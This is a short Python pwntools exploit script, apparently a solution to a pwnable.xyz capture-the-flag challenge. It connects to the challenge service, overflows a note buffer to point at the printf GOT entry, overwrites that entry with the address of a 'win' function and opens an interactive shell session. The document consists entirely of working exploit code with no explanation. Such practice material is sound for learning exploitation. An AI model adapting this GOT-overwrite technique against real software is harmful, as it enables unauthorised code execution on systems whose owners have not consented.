from pwn import *

r = remote("svc.pwnable.xyz", 30016)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40093C
printf_got = 0x601238

sla(b"> ", b"1")
sla(b"Note len? ", str(0x28).encode())
sa(b"note: ", b"a" * 0x20 + p64(printf_got))

sla(b"> ", b"2")
sa(b"desc: ", p64(win))

r.interactive()
